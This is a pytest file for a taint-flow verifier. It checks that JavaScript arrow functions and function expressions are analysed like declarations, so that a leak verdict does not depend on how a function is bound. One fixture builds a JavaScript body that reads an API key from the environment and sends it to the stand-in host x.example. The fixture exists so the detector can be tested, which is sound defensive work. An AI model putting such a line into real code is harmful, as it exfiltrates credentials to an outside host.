# SPDX-License-Identifier: AGPL-3.0-or-later
"""A JS callable named after its binding is walked by the DDG (WI-mufag).

Besides ``function_declaration`` and ``method_definition``, the JS/TS DDG
walks every callable ``js_ts.py`` names after its BINDING -- ``const handler =
(req) => {...}``, ``obj.f = function (){}``, an anonymous callback. In JS these
are a large share of all callables, and an unwalked callable's findings fall to
the ``structural`` arm.

THE COST IS FALSE POSITIVES, NOT ONLY LOST PRECISION. A key read and only its
LENGTH logged, then an unrelated ``fetch(url)``: as a walked ``function``
declaration it reads CONFIRMED (the walk refutes the flow); the same body as an
unwalked arrow would read VIOLATED (structural/unavailable).

ONE HOME FOR THE NAME. js_ts names these callables half a dozen ways
(``handler``, ``_cb_<callee>``, ``_iife``, ...); re-deriving that in the DDG
would be a second copy that drifts. The DDG instead takes the analyzer's own
symbol at the node's exact span, and walks nothing the analyzer did not name.
"""
from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path

import pytest

from hypergumbo_core.cli import main

_CLAIMS = (
    "claims:\n  - id: C\n    text: t\n    constraint:\n      taint_flow:\n"
    "        source_taint: host_secret\n        prohibited_sink_zone: network\n"
)

#: The same body under each binding shape: the key IS sent.
_LEAK = (
    "  const k = process.env.API_KEY;\n"
    '  return fetch("https://x.example/?k=" + k);\n'
)
#: The key is read, only its length is logged, and the fetch sends no secret.
_NO_LEAK = (
    "  const k = process.env.API_KEY;\n"
    "  console.log(k.length);\n"
    "  return fetch(url);\n"
)

_SHAPES = {
    "declaration": "function handler(url) {{\n{body}}}\nmodule.exports = {{ handler }};\n",
    "arrow": "const handler = (url) => {{\n{body}}};\nmodule.exports = {{ handler }};\n",
    "function_expression": (
        "const handler = function (url) {{\n{body}}};\nmodule.exports = {{ handler }};\n"
    ),
}


def _verdict(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, text: str) -> dict:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "app.js").write_text(text)
    claims = tmp_path / "claims.yaml"
    claims.write_text(_CLAIMS)
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
        main(["verify-claims", str(repo), "--claims", str(claims), "--format", "json"])
    (verdict,) = json.loads(buf.getvalue())["verdicts"]
    return verdict


@pytest.mark.parametrize("shape", sorted(_SHAPES))
def test_a_real_leak_is_confirmed_by_the_walk(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, shape: str,
) -> None:
    verdict = _verdict(tmp_path, monkeypatch, _SHAPES[shape].format(body=_LEAK))
    assert verdict["verdict"] == "violated", verdict["details"]
    assert {e["analysis_method"] for e in verdict["evidence"]} == {"ddg"}, verdict["evidence"]


@pytest.mark.parametrize("shape", sorted(_SHAPES))
def test_no_leak_is_no_finding_whatever_the_binding(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, shape: str,
) -> None:
    """WI-mufag's false positive: the arrow must not read VIOLATED where the declaration does not."""
    verdict = _verdict(tmp_path, monkeypatch, _SHAPES[shape].format(body=_NO_LEAK))
    assert verdict["verdict"] == "confirmed", verdict["evidence"]
